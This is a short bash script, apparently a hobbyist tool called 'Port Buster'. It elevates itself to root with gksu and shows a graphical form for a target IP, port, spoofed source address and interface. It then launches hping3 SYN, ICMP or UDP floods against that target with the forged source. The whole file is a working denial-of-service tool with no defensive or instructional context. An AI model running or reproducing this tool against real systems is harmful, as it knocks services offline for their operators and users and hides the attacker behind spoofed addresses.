#!/bin/bash

if [ "$UID" != "0" ]
then
#gksu ./flood.sh
gksu $0
else
function menu()
{
values=$(yad --buttons-layout=spread  --text-align=center --title="PORT BUSTER BY ORION_G33KS" --image=banner.png --image-on-top --form --field="EnterIP" --field="Enter Port" --field="Enter Source IP" --field="Enter Interface" --field=FLOOD_TYPE:CB  '192.168.1.1' '80' '192.168.1.100' 'wlan0' '!^SYN!ICMP!UDP' )

ip=$(echo $values | awk -F"|" '{print $1}')
port=$(echo $values | awk -F"|" '{print $2}')
source=$(echo $values | awk -F"|" '{print $3}')
interface=$(echo $values | awk -F"|" '{print $4}')
type=$(echo $values | awk -F"|" '{print $5}')


if [ "$type" == "SYN" ]
then
xterm  -e hping3 --flood -V -b -I $interface -S -a $source -p $port $ip 
menu
elif [ "$type" == "ICMP" ]
then
xterm -e hping3 -V --flood -1 -I $interface -a $source -p $port $ip
menu
elif [ "$type" == "UDP" ]
then
xterm -e hping3 -V --flood -b -2 -a $source -I $interface -p $port $ip
menu
else
exit
fi
}
menu
fi